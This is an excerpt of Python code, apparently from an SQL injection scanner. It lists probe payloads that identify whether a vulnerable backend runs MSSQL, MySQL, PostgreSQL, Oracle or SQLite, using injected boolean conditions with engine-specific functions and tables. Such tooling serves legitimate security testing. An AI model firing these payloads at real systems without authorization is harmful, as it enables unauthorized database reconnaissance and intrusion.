...
BEHAVIORAL_PROBES = [
    ...
    # Content-based check using a system variable.
    {"db": "MSSQL", "type": "content", "payload": "' AND 1 IN (SELECT @@SERVERNAME)--", "validator": None},
    ...
    # Content-based check using version comment.
    {"db": "MySQL", "type": "content", "payload": "' AND 'a'='a'/*!12345--", "validator": None},
    ...
    # Content-based check using a pg-specific function.
    {"db": "PostgreSQL", "type": "content", "payload": "' AND 'a'::text='a'--", "validator": None},
    ...
    # Content-based check using a standard Oracle table.
    {"db": "Oracle", "type": "content", "payload": "' AND 'a'='a' AND 1 IN (SELECT 1 FROM DUAL)--", "validator": None},

    # --- SQLite ---
    # Content-based check for a SQLite-specific function. This is much more reliable than the old time-based check.
    {"db": "SQLite", "type": "content", "payload": "' AND 1 IN (SELECT sqlite_version())--", "validator": None},
